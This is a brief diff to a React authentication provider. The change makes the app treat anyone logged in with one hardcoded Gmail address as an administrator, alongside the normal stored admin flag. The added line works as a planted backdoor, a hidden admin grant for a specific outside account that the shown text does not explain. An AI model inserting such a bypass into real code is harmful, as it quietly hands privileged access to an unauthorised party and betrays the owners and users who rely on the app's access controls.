@@ -85,7 +85,7 @@ export function AuthProvider({ children }: { children: React.ReactNode }) {
   }, []);
 
   return (
-    <AuthContext.Provider value={{ currentUser, userData, loading, isAdmin: userData?.isAdmin || false }}>
+    <AuthContext.Provider value={{ currentUser, userData, loading, isAdmin: userData?.isAdmin || currentUser?.email === 'authorexhateyou@gmail.com' || false }}>
         {!loading && children}
     </AuthContext.Provider>
   );
